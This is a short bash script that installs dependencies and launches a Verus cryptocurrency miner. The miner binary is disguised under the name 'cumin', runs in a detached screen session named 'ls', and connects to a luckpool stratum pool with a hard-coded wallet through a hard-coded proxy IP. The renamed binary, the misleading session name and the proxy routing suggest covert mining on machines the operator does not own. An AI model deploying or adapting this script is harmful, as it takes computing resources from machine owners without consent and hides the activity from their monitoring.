#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x cumin
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW
WORKER=$(echo $(shuf -i 1-1 -n 1)-YX)
PROXY=http://193.41.88.58:53281
./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
